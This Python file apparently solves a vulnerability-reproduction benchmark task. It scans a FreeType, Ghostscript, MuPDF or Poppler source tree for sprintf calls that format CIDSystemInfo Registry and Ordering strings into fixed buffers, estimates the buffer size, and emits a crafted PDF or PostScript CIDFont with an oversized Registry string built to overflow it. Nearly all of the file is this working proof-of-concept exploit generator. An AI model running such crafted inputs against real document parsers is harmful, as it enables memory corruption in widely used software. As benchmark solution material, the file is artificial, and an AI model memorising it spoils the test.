import os
import re
import tarfile
import ast
from typing import Dict, Iterator, Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        project = self._detect_project(src_path)
        defines = self._collect_defines(src_path)
        buf_n = self._infer_fallback_buffer_size(src_path, defines)

        if buf_n is None:
            reg_len = 80000
        else:
            reg_len = max(128, buf_n + 64)

        registry = b"A" * reg_len
        ordering = b"B"

        if project == "freetype":
            return self._build_ps_cidfont(registry, ordering)
        return self._build_pdf(registry, ordering)

    def _iter_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if not st.st_size:
                        continue
                    if st.st_size > 8_000_000:
                        continue
                    try:
                        with open(p, "rb") as f:
                            yield p, f.read()
                    except OSError:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 8_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield m.name, data
                    except Exception:
                        continue
        except Exception:
            return

    def _detect_project(self, src_path: str) -> str:
        names = []
        if os.path.isdir(src_path):
            for root, dirs, files in os.walk(src_path):
                for fn in files:
                    names.append(os.path.join(root, fn).replace("\\", "/"))
                if len(names) > 2000:
                    break
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        names.append(m.name)
                        if len(names) > 5000:
                            break
            except Exception:
                names = []

        lowered = [n.lower() for n in names]
        if any("include/freetype" in n or n.endswith("include/freetype/freetype.h") for n in lowered):
            return "freetype"
        if any("/src/base/ftobjs.c" in n or n.endswith("src/base/ftobjs.c") for n in lowered):
            return "freetype"
        if any("/base/" in n and (n.endswith("/gconfig_.h") or n.endswith("/gserrors.h") or n.endswith("/gsmemory.h")) for n in lowered):
            return "ghostscript"
        if any("/psi/" in n and (n.endswith("/imain.c") or n.endswith("/interp.c")) for n in lowered):
            return "ghostscript"
        if any("mupdf" in n and (n.endswith("source/pdf/pdf-parse.c") or n.endswith("include/mupdf/fitz.h")) for n in lowered):
            return "mupdf"
        if any("poppler" in n and (n.endswith("poppler/pdfparser.cc") or n.endswith("poppler/poppler-config.h")) for n in lowered):
            return "poppler"
        return "unknown_pdf_like"

    def _collect_defines(self, src_path: str) -> Dict[str, int]:
        defines: Dict[str, int] = {}
        define_re = re.compile(rb"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/\*.*\*/\s*)?$")
        for name, data in self._iter_files(src_path):
            ln = name.lower()
            if not (ln.endswith(".h") or ln.endswith(".c") or ln.endswith(".cc") or ln.endswith(".cpp") or ln.endswith(".hpp") or ln.endswith(".inc")):
                continue
            if len(data) > 2_000_000:
                continue
            try:
                lines = data.splitlines()
            except Exception:
                continue
            for line in lines:
                m = define_re.match(line)
                if not m:
                    continue
                key = m.group(1).decode("ascii", "ignore")
                rhs = m.group(2).decode("ascii", "ignore").strip()
                if not key:
                    continue
                rhs = rhs.split("//", 1)[0].strip()
                rhs = rhs.split("/*", 1)[0].strip()
                if not rhs:
                    continue
                val = self._safe_eval_int_expr(rhs, defines)
                if val is None:
                    mnum = re.match(r"^\(?\s*(0x[0-9A-Fa-f]+|\d+)\s*\)?(?:[uUlL]+)?\s*$", rhs)
                    if mnum:
                        try:
                            val = int(mnum.group(1), 0)
                        except Exception:
                            val = None
                if val is None:
                    continue
                if 0 <= val <= 10_000_000:
                    defines.setdefault(key, val)
        return defines

    def _infer_fallback_buffer_size(self, src_path: str, defines: Dict[str, int]) -> Optional[int]:
        best_score = -1
        best_n: Optional[int] = None

        fmt_re = re.compile(
            r'\b([A-Za-z_]\w*)\s*\(\s*([A-Za-z_]\w*)\s*,\s*"([^"]*%s[^"]*-[^"]*%s[^"]*)"\s*,',
            re.DOTALL,
        )

        array_decl_re_cache: Dict[str, re.Pattern] = {}

        for name, data in self._iter_files(src_path):
            ln = name.lower()
            if not (ln.endswith(".c") or ln.endswith(".cc") or ln.endswith(".cpp") or ln.endswith(".cxx") or ln.endswith(".h") or ln.endswith(".hpp") or ln.endswith(".inc")):
                continue
            if b"%s" not in data or b"-" not in data:
                continue
            if b"CIDSystemInfo" not in data and b"Registry" not in data and b"Ordering" not in data and b"cid" not in data and b"CID" not in data:
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                continue

            if "%s" not in text or "-" not in text:
                continue

            for m in fmt_re.finditer(text):
                func = m.group(1)
                var = m.group(2)
                fmt = m.group(3)

                score = 0
                lfunc = func.lower()
                if "sprintf" in lfunc or "vsprintf" in lfunc:
                    if "snprintf" in lfunc or "vsnprintf" in lfunc:
                        score += 1
                    else:
                        score += 4
                else:
                    continue

                if "%s" in fmt and "-%s" in fmt:
                    score += 1

                pos = m.start()
                ctx_start = max(0, pos - 1200)
                ctx_end = min(len(text), pos + 1200)
                ctx = text[ctx_start:ctx_end]

                if "CIDSystemInfo" in ctx:
                    score += 6
                if "Registry" in ctx:
                    score += 4
                if "Ordering" in ctx:
                    score += 4
                if "fallback" in ctx.lower():
                    score += 3
                if "cid" in ctx.lower():
                    score += 1

                if var not in array_decl_re_cache:
                    array_decl_re_cache[var] = re.compile(
                        r"\b(?:static\s+)?(?:const\s+)?(?:unsigned\s+)?(?:char|FT_Byte|FT_Char|uint8_t|byte|gs_char)\s+"
                        + re.escape(var)
                        + r"\s*\[\s*([^\]]+)\s*\]",
                        re.MULTILINE,
                    )
                mdecl = array_decl_re_cache[var].search(text)
                if not mdecl:
                    continue
                expr = mdecl.group(1).strip()
                n = self._safe_eval_int_expr(expr, defines)
                if n is None:
                    mnum = re.match(r"^\(?\s*(0x[0-9A-Fa-f]+|\d+)\s*\)?(?:[uUlL]+)?\s*$", expr)
                    if mnum:
                        try:
                            n = int(mnum.group(1), 0)
                        except Exception:
                            n = None
                if n is None or n <= 0 or n > 10_000_000:
                    continue

                if score > best_score:
                    best_score = score
                    best_n = n
                    if best_score >= 16:
                        return best_n

        return best_n

    def _safe_eval_int_expr(self, expr: str, defines: Dict[str, int]) -> Optional[int]:
        if not expr:
            return None
        expr = expr.strip()
        if not expr:
            return None

        expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.DOTALL).strip()
        expr = re.sub(r"//.*$", "", expr, flags=re.MULTILINE).strip()
        if not expr:
            return None

        expr = re.sub(r"(\d+|0x[0-9A-Fa-f]+)\s*([uUlL]+)\b", r"\1", expr)

        if "sizeof" in expr or "offsetof" in expr:
            return None
        if "(" in expr and ")" in expr:
            pass

        tokens = re.findall(r"[A-Za-z_]\w*|0x[0-9A-Fa-f]+|\d+|<<|>>|[-+*/%&^|()~]", expr)
        if not tokens:
            return None

        out: List[str] = []
        for t in tokens:
            if re.fullmatch(r"[A-Za-z_]\w*", t):
                if t in defines:
                    out.append(str(defines[t]))
                else:
                    return None
            else:
                out.append(t)
        expr2 = "".join(out)

        try:
            node = ast.parse(expr2, mode="eval")
        except Exception:
            return None

        def eval_node(n):
            if isinstance(n, ast.Expression):
                return eval_node(n.body)
            if isinstance(n, ast.Constant):
                if isinstance(n.value, int):
                    return n.value
                return None
            if isinstance(n, ast.UnaryOp):
                v = eval_node(n.operand)
                if v is None:
                    return None
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
                if isinstance(n.op, ast.Invert):
                    return ~v
                return None
            if isinstance(n, ast.BinOp):
                a = eval_node(n.left)
                b = eval_node(n.right)
                if a is None or b is None:
                    return None
                op = n.op
                if isinstance(op, ast.Add):
                    return a + b
                if isinstance(op, ast.Sub):
                    return a - b
                if isinstance(op, ast.Mult):
                    return a * b
                if isinstance(op, ast.FloorDiv):
                    if b == 0:
                        return None
                    return a // b
                if isinstance(op, ast.Div):
                    if b == 0:
                        return None
                    return int(a / b)
                if isinstance(op, ast.Mod):
                    if b == 0:
                        return None
                    return a % b
                if isinstance(op, ast.LShift):
                    return a << b
                if isinstance(op, ast.RShift):
                    return a >> b
                if isinstance(op, ast.BitOr):
                    return a | b
                if isinstance(op, ast.BitAnd):
                    return a & b
                if isinstance(op, ast.BitXor):
                    return a ^ b
                return None
            return None

        val = eval_node(node)
        if val is None:
            return None
        if not isinstance(val, int):
            return None
        return val

    def _build_pdf(self, registry: bytes, ordering: bytes) -> bytes:
        content_stream = b"BT /F1 12 Tf 72 720 Td (X) Tj ET\n"
        content_obj = b"<< /Length " + str(len(content_stream)).encode("ascii") + b" >>\nstream\n" + content_stream + b"endstream\n"

        cid_font_obj = (
            b"<< /Type /Font /Subtype /CIDFontType2\n"
            b"/CIDSystemInfo << /Registry ("
            + registry
            + b") /Ordering ("
            + ordering
            + b") /Supplement 0 >>\n"
            b"/FontDescriptor 7 0 R\n"
            b"/CIDToGIDMap /Identity\n"
            b"/DW 1000\n"
            b">>\n"
        )

        objs = [
            b"<< /Type /Catalog /Pages 2 0 R >>\n",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n",
            b"<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 612 792] /Contents 5 0 R >>\n",
            b"<< /Type /Font /Subtype /Type0 /BaseFont /Dummy /Encoding /Identity-H /DescendantFonts [6 0 R] >>\n",
            content_obj,
            cid_font_obj,
            b"<< /Type /FontDescriptor /FontName /Dummy /Flags 4 /Ascent 800 /Descent -200 /CapHeight 700 /ItalicAngle 0 /StemV 80 /FontBBox [0 -200 1000 900] >>\n",
        ]

        pdf = bytearray()
        pdf.extend(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
        offsets = [0] * (len(objs) + 1)

        for i, obj in enumerate(objs, start=1):
            offsets[i] = len(pdf)
            pdf.extend(str(i).encode("ascii"))
            pdf.extend(b" 0 obj\n")
            pdf.extend(obj)
            if not obj.endswith(b"\n"):
                pdf.extend(b"\n")
            pdf.extend(b"endobj\n")

        xref_off = len(pdf)
        pdf.extend(b"xref\n")
        size = len(objs) + 1
        pdf.extend(b"0 ")
        pdf.extend(str(size).encode("ascii"))
        pdf.extend(b"\n")
        pdf.extend(b"0000000000 65535 f \n")
        for i in range(1, size):
            off = offsets[i]
            pdf.extend(f"{off:010d} 00000 n \n".encode("ascii"))

        pdf.extend(b"trailer\n")
        pdf.extend(b"<< /Size ")
        pdf.extend(str(size).encode("ascii"))
        pdf.extend(b" /Root 1 0 R >>\n")
        pdf.extend(b"startxref\n")
        pdf.extend(str(xref_off).encode("ascii"))
        pdf.extend(b"\n%%EOF\n")
        return bytes(pdf)

    def _build_ps_cidfont(self, registry: bytes, ordering: bytes) -> bytes:
        parts = [
            b"%!PS-Adobe-3.0 Resource-CIDFont\n",
            b"%%Title: (PoC)\n",
            b"%%EndComments\n",
            b"/CIDInit /ProcSet findresource begin\n",
            b"12 dict begin\n",
            b"begincidfont\n",
            b"/CIDFontType 0 def\n",
            b"/CIDSystemInfo 3 dict dup begin\n",
            b"/Registry (",
            registry,
            b") def\n",
            b"/Ordering (",
            ordering,
            b") def\n",
            b"/Supplement 0 def\n",
            b"end def\n",
            b"/CIDCount 1 def\n",
            b"endcidfont\n",
            b"end\n",
            b"end\n",
            b"%%EOF\n",
        ]
        return b"".join(parts)